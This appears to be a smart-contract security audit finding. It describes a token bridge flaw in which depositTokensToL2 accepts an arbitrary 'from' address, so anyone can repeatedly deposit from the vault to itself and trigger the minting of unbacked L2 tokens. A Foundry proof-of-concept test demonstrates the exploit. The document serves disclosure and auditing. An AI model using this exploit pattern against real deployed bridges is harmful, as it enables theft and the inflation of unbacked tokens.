### [H-2] Calling `depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked tokens

`depositTokensToL2` function allows the caller to specify the `from` address, from which tokens are taken.

Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it's possible for an attacker to call the `depositTokensToL2` function and transfer tokens from the vault to the vault itself. This would allow the attacker to trigger the `Deposit` event any number of times, presumably causing the minting of unbacked tokens in L2.

Additionally, they could mint all the tokens to themselves.

As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

```javascript
function testCanTransferFromVaultToVault() public {
    vm.startPrank(attacker);

    // assume the vault already holds some tokens
    uint256 vaultBalance = 500 ether;
    deal(address(token), address(vault), vaultBalance);

    // Can trigger the `Deposit` event self-transferring tokens in the vault
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    // Any number of times
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    vm.stopPrank();
}
```
